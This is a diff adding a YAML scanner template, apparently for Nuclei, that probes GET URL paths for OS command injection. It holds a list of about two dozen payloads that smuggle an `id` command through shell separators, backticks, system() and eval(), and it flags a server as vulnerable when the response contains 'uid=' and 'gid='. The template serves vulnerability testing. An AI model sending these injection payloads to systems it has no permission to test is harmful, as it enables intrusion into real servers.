@@ -1,0 +1,50 @@
+id: rce-injection-uri
+
+info:
+  name: OS Injection Get Detection for GET parameters
+  description: Template to check for os command Injection vulnerabilities in GET  Url must be https://target.com/site={we will put local host here}
+  severity: critical
+  author: reewardius
+  tags: fuzzing-rce,generic,rce
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{rce}}"
+      
+    payloads:
+      rce:
+        - ";echo `id`"
+        - ";echo `id` #"
+        - ";echo `id` ;"
+        - "& echo `id` #"
+        - "& echo `id` &"
+        - "| echo `id`"
+        - "# echo `id`"
+        - "| echo `id`"
+        - "$(echo `id`)"
+        - "|| echo `id`"
+        - "| echo `id` |"
+        - "|| echo `id` ||"
+        - ";echo `id`;"
+        - "` ehoc test `"
+        - "%0a echo `id` %0a "
+        - ";echo `id`|"
+        - ";|/usr/bin/echo `id`|"
+        - "\n/bin/echo `id` \n"
+        - ";system('echo `id`')"
+        - ";system('echo `id`')"
+        - ";system('echo `id`')"
+        - "eval('echo `id`')"
+        - "eval('echo `id`');"
+        - "response.write `id`"
+        - ":response.write `id`"
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
